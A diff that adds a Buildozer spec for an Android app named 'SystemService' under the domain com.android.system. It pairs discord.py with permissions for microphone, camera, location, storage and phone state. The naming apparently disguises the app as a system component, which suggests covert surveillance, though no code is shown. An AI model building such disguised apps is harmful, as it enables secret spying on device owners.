@@ -1,2 +1,40 @@
-# Install dependencies lainnya
-sudo apt install -y git zip unzip python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev python3-dev python3-setuptools python3-wheel python3-venv python3-full
+[app]
+title = SystemService
+package.name = systemservice
+package.domain = com.android.system
+
+source.dir = .
+source.include_exts = py,png,jpg,kv,atlas,txt
+source.main = SystemHelper.py
+
+version = 1.0
+requirements = python3,openssl,requests,pillow,discord.py,pyjnius,kivy
+
+orientation = portrait
+
+android.permissions = INTERNET,ACCESS_NETWORK_STATE,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,RECORD_AUDIO,CAMERA,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,ACCESS_WIFI_STATE,READ_PHONE_STATE,WAKE_LOCK
+
+android.api = 30
+android.minapi = 24
+android.ndk = 23b
+android.sdk = 33
+android.ndk_api = 21
+
+# presplash.filename = %(source.dir)s/assets/presplash.png
+# icon.filename = %(source.dir)s/assets/icon.png
+
+android.arch = arm64-v8a,armeabi-v7a
+
+# Add any additional dependencies
+p4a.branch = develop
+# android.add_src = ./assets
+
+# Add additional Java files if needed
+# android.add_java_files = 
+
+# Add additional activities
+# android.manifest.activities = 
+# android.manifest.application = 
+
+[buildozer]
+log_level = 2
